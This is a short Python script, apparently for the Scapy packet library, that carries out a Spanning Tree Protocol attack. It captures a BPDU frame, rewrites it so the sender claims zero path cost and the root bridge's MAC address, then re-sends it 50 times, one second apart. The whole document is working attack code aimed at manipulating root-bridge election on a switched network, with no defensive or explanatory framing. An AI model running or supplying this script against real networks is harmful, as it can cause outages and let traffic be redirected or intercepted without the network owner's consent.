#!/usr/bin/env python3
from scapy.all import sniff, sendp, time

# Define variables
destination_mac = "01:80:c2:00:00:00"
loop_count = 50
delay_between_packets = 1

# Capture STP frame
stp_frame = sniff(filter=f"ether dst {destination_mac}", count=1)

# Block port to root switch
# Set cost to root to zero
stp_frame[0].pathcost = 0

# Set bridge MAC to root bridge
stp_frame[0].bridgemac = stp_frame[0].rootmac

# Set port ID to 1
stp_frame[0].portid = 1

# Loop to send multiple BPDUs
for i in range(0, loop_count):
    time.sleep(delay_between_packets)
    stp_frame[0].show()
    sendp(stp_frame[0], loop=0, verbose=1)